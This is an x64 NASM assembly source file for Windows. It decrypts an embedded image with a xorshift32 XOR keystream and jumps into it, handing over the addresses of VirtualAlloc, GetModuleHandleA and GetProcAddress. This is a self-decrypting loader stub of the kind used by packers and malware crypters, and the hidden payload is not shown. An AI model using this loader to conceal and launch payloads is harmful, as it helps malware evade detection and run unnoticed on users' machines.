default rel
bits 64

global start

extern VirtualAlloc
extern GetModuleHandleA
extern GetProcAddress

%include "seed.inc"

section .text
    start:
        sub rsp, 8 + 8 * 16

        mov r13, seed
        mov r14, image
        xor r15, r15
        
        .again:
        xor [r14 + r15 * 4], r13d
        mov eax, r13d
        shl eax, 13
        xor r13d, eax
        mov eax, r13d
        shr eax, 17
        xor r13d, eax
        mov eax, r13d
        shl eax, 5
        xor r13d, eax
        inc r15
        cmp r15, (end - image) / 4
        jb .again

        lea rcx, VirtualAlloc
        call r14
        lea rcx, GetModuleHandleA
        lea rdx, GetProcAddress
        jmp rax

    align 8
    image:
        %include "xsh32.inc"

    end:
